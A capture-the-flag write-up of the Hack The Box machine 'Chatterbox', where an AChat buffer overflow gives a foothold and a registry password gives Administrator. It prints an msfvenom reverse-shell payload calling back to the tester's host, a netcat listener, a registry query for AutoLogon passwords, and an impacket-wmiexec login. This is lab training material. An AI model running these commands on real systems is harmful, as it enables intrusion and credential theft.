# Chatterbox (HTB)

> Platform: Hack The Box  
> OS: Windows  
> Difficulty: Medium  
> Result: Administrator

---

## Attack Chain

```text
Reconnaissance
  |-- Nmap scan reveals SMB and AChat service
  \-- Foothold
       |-- AChat 0.150 beta7 SEH Buffer Overflow
       \-- Reverse shell as alfred
Privilege Escalation
  |-- AutoLogon registry password leak
  \-- WMIExec as Administrator
```

> [!NOTE]
> All flags, passwords, hashes, and session tokens have been masked for ethical reasons.

---

## Machine Briefing
Chatterbox is a Medium Windows machine running Windows 7 Professional. It hosts a vulnerable chat server (AChat) which can be exploited via a buffer overflow to gain an initial shell. Privilege escalation is achieved by finding a cleartext password in the Windows registry.

## Reconnaissance
A full TCP port scan reveals several standard Windows services and a custom chat application.

```bash
$ nmap -p- --min-rate 5000 -T4 -Pn -n 10.10.10.74
...
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
9255/tcp open  http
9256/tcp open  achat
```

Service detection confirms the OS and the specific version of the chat software.

```bash
$ nmap -sC -sV -p 135,139,445,9255,9256 10.10.10.74
...
445/tcp  open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds
9255/tcp open  http         AChat chat system httpd
9256/tcp open  achat        AChat chat system
```

## Foothold
No CVE (custom vulnerability) - the AChat 0.150 beta7 service is vulnerable to a stack-based SEH buffer overflow in its UDP message handler; no public CVE is assigned.

Searching for public exploits reveals a Python script targeting this specific version.

```bash
$ searchsploit AChat
...
Achat 0.150 beta7 - Remote Buffer Overflow | windows/remote/36025.py
```

We copy the exploit and generate a reverse shell payload. The payload is encoded with `unicode_mixed` and avoids bad characters (`\x00\x0a\x0d\x20`) to prevent crashing the service prematurely.

```bash
$ msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=443 -e x86/unicode_mixed -b '\x00\x0a\x0d\x20' BufferRegister=EAX -f python
...
Payload size: 642 bytes
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

After updating the script with our IP and payload, we start a listener and execute the exploit.

```bash
$ nc -nlvp 443
listening on [any] 443 ...
```

```bash
$ python3 exploit.py
---->{P00F}!
```

The target connects back, granting us a shell as `alfred`.

```text
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.74] 49158
Microsoft Windows [Version 6.1.7601]
C:\Windows\system32>
```

We can now read the user flag.

```cmd
C:\Windows\system32> type C:\Users\Alfred\Desktop\user.txt
<USER_FLAG>
```

## Privilege Escalation
Checking the Windows registry for AutoLogon credentials reveals a cleartext password for the Administrator account.

```cmd
C:\Windows\system32> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
...
    DefaultPassword    REG_SZ    <PASSWORD>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

Using the recovered password, we authenticate as Administrator via WMI. While `psexec` gives a SYSTEM shell, the `root.txt` file is protected by ACLs (Access is denied). Using `wmiexec` runs the shell in the context of the Administrator user, bypassing the ACL restriction.

```bash
$ impacket-wmiexec Administrator:'<PASSWORD>'@10.10.10.74
...
C:\> whoami
chatterbox\administrator
```

Finally, we read the root flag.

```cmd
C:\> type C:\Users\Administrator\Desktop\root.txt
<ROOT_FLAG>
```

## Flags

| Flag | Value |
|------|-------|
| User | `<USER_FLAG>` |
| Root | `<ROOT_FLAG>` |

## Key Takeaways
- Custom chat applications (like AChat) are frequently vulnerable to basic buffer overflows; always check `searchsploit` and adapt payloads to avoid bad characters.
- Always check the registry for AutoLogon credentials (`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`) when you have any level of access.
- `psexec` runs as SYSTEM, which can be blocked by file ACLs even if you have admin rights. `wmiexec` runs as the user, bypassing these specific restrictions.